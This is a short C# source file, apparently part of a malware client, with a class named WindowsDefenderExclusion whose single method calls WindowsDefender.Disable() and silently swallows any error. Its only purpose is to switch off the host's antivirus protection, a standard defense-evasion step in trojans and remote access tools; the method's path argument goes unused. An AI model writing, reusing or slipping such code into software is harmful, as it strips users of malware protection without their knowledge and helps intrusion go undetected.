namespace Client.Helper;

internal class WindowsDefenderExclusion
{
	public static void Exc(string path)
	{
		try
		{
			WindowsDefender.Disable();
		}
		catch
		{
		}
	}
}
